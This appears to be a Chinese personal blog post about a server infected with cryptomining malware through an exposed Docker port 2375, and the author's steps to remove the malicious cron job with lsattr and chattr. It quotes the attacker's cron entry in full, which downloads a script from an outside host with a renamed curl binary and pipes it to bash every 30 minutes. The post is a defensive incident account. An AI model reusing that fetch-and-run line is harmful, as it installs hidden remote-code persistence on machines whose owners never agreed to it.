---
title: 记一次服务器遭到挖矿病毒感染的经历
author: 寒雨
hide: false
summary: 2375端口真不能开，开了就中招
categories: 杂谈
tags:
  - 运维
---

# 记一次服务器遭到挖矿病毒感染的经历

## 起因

在鼓捣docker，看了一些教程，为了方便一些操作打开了2375端口，导致被人docker注入了。

## 应对过程

其实我之前完全没有面对过服务器遭到病毒攻击的问题...最开始是腾讯云给我发短信，说我的服务器存在危险行为，并且封禁了这台服务器一天。

当时一上去我就感觉到不对了，服务器上经常莫名奇妙多一个docker镜像，删了也没用。

后面我使用`crontab -l`排查了一下定时任务，发现里面有一个奇怪的任务。

~~~sh
*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash > /dev/null 2>&1
~~~

看样子这就是问题所在了，它会定时下载一个脚本文件并且执行。那么只要把它删掉不就完事大吉了？

于是我试图用`crontab -e`删掉它，最后却发现无法编辑这个配置。

> "/tmp/crontab.Awo30z" 1L, 1C written
> crontab: installing new crontab
> /var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted
> crontab: edits left in /tmp/crontab.Awo30z

病毒怎么可能会让你轻松的删掉这个定时任务？它修改了文件的属性，让它无法被修改——即便你拥有root的最高权限。

百度后找到了解决方案

>  查看是否有特殊的属性 lsattr /var/spool/cron/ 
>
>  去掉特殊的属性 chattr -ai /var/spool/cron/root  && lsattr /var/spool/cron/root

但是有一点很奇怪，我的腾讯云机器上无法使用chattr指令。他会询问我是否安装一个包，但真安装时却说这个包已经安装过了，不知道这是不是病毒搞得鬼。

> [root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron
> bash: chattr: command not found...
> Install package 'e2fsprogs' to provide command 'chattr'? [N/y] y  
>
>
>  * Waiting in queue... Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed

于是我把包给卸载重装了一次，就可以了

> yum remove e2fsprogs-1.45.6-2.tl3.x86_64

去除特殊权限后就可以编辑定时任务了。